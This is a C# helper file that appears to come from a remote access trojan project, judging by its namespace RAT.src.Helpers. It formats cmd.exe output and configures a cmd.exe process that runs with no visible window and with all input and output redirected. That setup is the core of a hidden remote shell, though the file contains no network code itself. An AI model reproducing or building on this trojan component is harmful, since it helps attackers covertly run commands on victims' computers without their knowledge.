using System;
using System.Diagnostics;
using System.Text;

namespace RAT.src.Helpers
{
    /// <summary>
    /// Helper class for cmd related stuff.
    /// </summary>
    public static class CmdHelper
    {
        /// <summary>
        /// Formats and adds missing characters + removes unneded ones.
        /// </summary>
        /// <param name="cmdCommand">Cmd command in FULL format a.k.a "C:\Users\SomeUser>More? echo 1"</param>
        /// <returns>Formatted cmd command.</returns>
        public static string FormatCmdForResponse(string cmdCommand)
        {
            // Removes "More?" from cmd response.
            var cmdString = cmdCommand;
            int index = cmdString.IndexOf(">More? ", StringComparison.Ordinal);
            string cleanCmdMessage = (index < 0)
                ? cmdString
                : cmdString.Remove(index + 1, "More? ".Length);

            // Without "\n" this will be poorly formatted.
            return cleanCmdMessage + "\n";
        }

        /// <summary>
        /// Gets configuration for cmd startup process.
        /// </summary>
        /// <returns>Process start info for cmd startup.</returns>
        public static ProcessStartInfo GetCmdStartupConfiguration()
        {
            return new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardInput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = Encoding.ASCII,
            };
        }
    }
}